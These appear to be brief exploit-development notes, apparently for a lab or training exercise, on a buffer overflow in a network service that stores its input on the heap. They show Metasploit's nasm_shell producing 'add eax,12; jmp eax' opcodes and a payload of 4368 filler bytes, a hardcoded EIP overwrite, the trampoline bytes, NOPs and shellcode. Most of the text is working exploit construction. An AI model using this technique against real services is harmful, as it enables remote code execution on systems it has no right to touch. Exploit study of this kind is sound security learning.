## Sometimes the stack does not have enough space for your shellcode
## or the input you pass into the program is not stored in the stack
## In those cases you will need to find where in memory your shellcode
## is stored and write code to access it.

## One example is a buffer overflow in an application that accepts data
## from a network socket into a sound buffer during initialization.
## The program copies all the bytes into the heap and stores a pointer
## to the section in EAX. Additionally the input must start with the
## string "setup sound "

## The following generates opcodes for skipping forward bytes in EAX
## to avoid junk and go straight to shell code section
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > add eax,12
00000000 83C00C add eax,byte +0xc
nasm > jmp eax
00000000 FFE0 jmp eax
nasm >

# find a jmp ESP to call the stack
# our stack will setup asm code to call our instructions

crash = ("A" * 4368)
EIP = "\x97\x45\x13\x08"

send payload:
    crash + eip + (\x83\xC0\x0C\xFF\xE0) + \x90\x90 + shellcode
